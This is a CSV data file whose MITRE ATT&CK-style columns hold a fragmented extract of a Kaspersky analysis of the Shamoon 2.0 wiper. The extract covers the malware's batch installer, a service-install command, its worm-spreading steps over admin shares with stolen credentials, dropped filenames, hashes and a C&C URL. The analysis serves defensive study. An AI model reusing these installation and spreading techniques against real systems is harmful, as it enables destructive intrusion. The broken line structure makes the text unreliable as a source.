url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
2, 2017 in St. Maarten
.
Several private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to
subscribers o
f
Kaspersky Lab’s Private Intelligence Reports
. For more information please
contact:
intelreports@kaspersky.com
,
Contact:
intelreports@kaspersky.com
7
2. Technical details
-
Shamoon 2.0
-
language
usage and possible Yemeni links
Several good technical articles on Shamoon 2.0
have been
published by some of our
colleagues
, including
Palo Alto
,
IBM X
-
Force
,
Symantec
and others.
Throughout this blog we describe some of the technical details of the new Shamoon
2.0 attacks
and what are the most important things that make them stand out. For the analysis we used the
earliest set of samples
,
with
a
hardcoded attack date of 17 November 2016
. H
owever, we’ve
also included details
from the newer samples
, such as hardc
oded credentials.
During deployment in the victim’s environment, the main Shamoon 2.0 wiper module is installed
through a Windows Batch file with the following content:
@echo off
set u100=ntertmgr32.exe
set u200=service
set u800=%~dp0
copy /Y
""%u800%%u100%"" ""%systemroot%
\
system32
\
%u100%"" start /b %systemroot%
\
system32
\
%u100%
%u200%
Interestingly, the sample resources appear to have a language ID of “Arabic (Yemen)”,
suggesting the attackers might be from Yemen. Of course, we should not
disreg
ard
the
possibility that the resource language could be a false flag planted there by the attackers.
2.1. 32
-
bit Shamoon dropper/worm (ntssrvr32.exe)
SHA256
394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b
MD5
5446f46d89124462ae7aca4fce420423
Compiled
2009.02.15 12:31:44 (GMT), VC 2010
Type
I386 Console EXE
Size
1 349 632 bytes
This executable is a worm designed to infect computers connected
to
a Windows domain. To
achieve this, it relies on a list of hardc
oded, previously stolen username/password pairs
belonging to administrators of the targeted domain. All the strings in the malware are obfuscated
,
Contact:
intelreports@kaspersky.com
8
with simple
one
byte ADD operations and are decrypted upon execution. All the dropped files
exhibit file times
altered to match that of the system’s
kernel32.dll
. The module only works if it
is run with exactly one command line parameter, regardless of the parameter. Otherwise, it
simply exits (likely a measure to avoid accidental execution).
If the victim host’s
system “
PROCESSOR_ARCHITECTURE
” environment variable is “
AMD64
”
or “
amd64
”, the module installs its 64
-
bit variant. The variant is contained within a resource
named “X509”. The resource is de
-
XORed and dropped onto the system under:
<
%WindowsDir%
\
system32
\
ntssrvr64.exe>
.
It is then installed as a service via the command:
“cmd.exe /c ""ping
-
n 30 127.0.0.1 >nul && sc config NtsSrv binpath=
""C:
\
WINDOWS
\
system32
\
ntssrvr64.exe LocalService"" && ping
-
n 10 127.0.0.1 >nul && sc start NtsSrv”
2.1.1.
Installation as a Service
If the malware is running on a 32
-
bit system, this module installs itself as a service named
“NtsSrv”:
Name
Display Name
Description
NtsSrv
Microsoft Network Realtime
Inspection Service
Helps guard against time change attempts
targeting known
and newly discovered vulnerabilities in network time protocols
he service is set as dependent on the “RpcSs” system service. The properties of the system
service “LanmanWorkstation” are changed so that it depends on the newly created “NtsS
rv”
service to allow it to start after the malware.
2.1.2. Worm Functionality
Once this module runs (as a service), the worm
-
spreading functionality is started
,
targeting
every network host within the IPv4 address range
,
with the same first
three
bytes of
the victim’s
IP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).
Here’s how it works:
1.
The worm connects to a remote machine’s registry and disables Remote UAC by setting
the
LocalAccountTokenFilterPolicy
regi
stry key value to 1 in
HKEY_LOCAL_MACHINE
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Policies
\
system.
2.
If the RemoteRegistry system service is disabled and doesn't run on the target system,
the worm reconfigures this service to be auto
-
started and then start
s it immediately. If
the connection to a remote registry is unsuccessful, the worm repeats the connection
attempt with a hardcoded set of stolen domain administrator credentials. The worm then ,
Contact:
intelreports@kaspersky.com
9
searches for remote “
\
windows
\
system32
\
csrss.exe
” files by prep
ending this path with
the victim machine’s IP as well as system shares: ""
ADMIN$
"", ""
C$
"", ""
D$
"", ""
E$
"".
3.
Once a remote system32 folder is found, the worm copies itself into this folder under the
name “
ntssrvr32.exe
”. It schedules a remote job to run “
ntssrvr32
.exe LocalService
”
after 90 seconds.
4.
If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the
service on the remote machine with the same parameters as it used for self
-
installation.
Attempts with stolen credentials are also pe
rformed.
5.
An
alternative
but similar infection method is coded in
to
the worm, where each infection
is performed in a separate thread without relying on the scheduler; but it is not used at
this time.
2.1.3. Command and Control (C&C) Module
After replication
, the malware runs a command
-
and
-
control communication module. This
module is contained within a resource named “
Pkcs7
”. It is de
-
XORed and dropped as
<
%WindowsDir%
\
system32
\
netinit.exe>
. Using the hardcoded credentials, it creates a
Windows Task Scheduler
job that executes netinit.exe 90 seconds after creation. It waits 95
seconds and then deletes the scheduled job.
2.1.4. Wiper and Encryptor Module
Finally, the malware drops the wiper/encryptor
module. This module first checks if it’s time to
run the main payload. The activation period can be set in two ways:
1.
It checks if the system time is not earlier than the time specified in the following file:
<%windir%
\
inf
\
usbvideo324.pnf>
2.
If the file does
n’t exist, it checks that the system time is not earlier than the hardcoded
date:
<20:45, 17 Nov 2016>
At the specified time, the malware drops
two
files:
The first file,
<c:
\
windows
\
temp
\
key8854321.pub>
is unused in this attack and contains a
public encry
ption key. This is an indicator that the attackers might be using
Shamoon as a
ransomware tool
in upcoming waves.
”
-----
BEGINPUBLICKEY
-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAusZItknNNeV+xjPzIZLyB5m6gaNREC6I3CZQ7F1vDU
CaGki83s6JVDo2NGN70mhx4q5NJrg
XDzD7McpxDoJsDkKwr5mm3yEs9vmZwHcEWcvU6QbJguFgPJk6zoatVq0
WsfIkN50ywQMVq2zmiJel2UoalPJzCWbAYG0BShXjnlcsfV8GcPW+fNRCSGKVue3RE6cV5HlAjSD8VSk4KERPu
Wfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC
oxXj6CSg9xKgGgnJazC/u3R0n
m/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ
eF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9
0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc
Ek+Dt8
s4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD
onmBm2AETME74MRPmC/FWgsCAwEAAQ==
-----
ENDPUBLICKEY
-----
”
,
Contact:
intelreports@kaspersky.com
10
The second file is dropped from a resource named “
PKCS12
”. It is de
-
XORed and dropped into
the %system% directory with
a name randomly selected from
the
following list:
caclsrv.exe
dvdquery.exe
msinit.exe
sigver.exe
wcscript.exe
certutl.exe
event.exe
ntfrsutil.exe
routeman.exe
ntnw.exe
clean.exe
findfile.exe
ntdsutl.exe
rrasrv.exe
netx.exe
ctrl.exe
gpget.exe
power.exe
sacses.exe
fsutl.exe
dfrag.exe
ipsecure.exe
rdsadmin.exe
sfmsc.exe
extract.exe
dnslookup.exe
iissrv.exe
regsys.exe
smbinit.exe
The dropped payload is then scheduled to run in the same way as the C&C communication
module. We describe it in detail
below.
2.2. 64
-
bit Shamoon Dropper (ntssrvr64.exe)
SHA256
47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34
MD5
8fbe990c2d493f58a2afa2b746e49c86
Compiled
2009.02.15 12:32:19 (GMT), VC 2010
Type
AMD64 Console EXE
Size
717 312 bytes
This dropper
has
the same functionality as the 32
-
bit variant. This version is contained within a
resource named “
X509
”. The resource is de
-
XORed and dropped onto the system under:
<%WindowsDir%
\
system32
\
ntssrvr64.exe>
.
2.2.1. C&C Communication Module (net
init.exe)
SHA256
61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842
MD5
5bac4381c00044d7f4e4cbfd368ba03b
Compiled
2009.02.15 12:29:20 (GMT), VC 2010
Type
I386 Console EXE
,
Contact:
intelreports@kaspersky.com
11
Size
159 744 bytes
SHA256
772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5
MD5
ac4d91e919a3ef210a59acab0dbb9ab5
Compiled
2009.02.15 12:29:41 (GMT), VC 2010
Type
AMD64 Console EXE
Size
183 808 bytes
The strings in the C&C module are obfuscated by simple ADD operations and are decrypted
upon execution. This module periodically connects to
a
C&C with the following URL:
hxxp://server/category/page.php?
shinu=
w74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb
XR+0ghrH
YIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==
The strange “
server
” in the URL string suggests multiple possibilities:
1.
It is used by mistake.
2.
It may suggest a placeholder value that wasn’t set for the purposes of this attack.
3.
A server with this name might be
installed by the attackers somewhere inside the local
network.
4.
The local network may rely on a now poisoned DNS server.
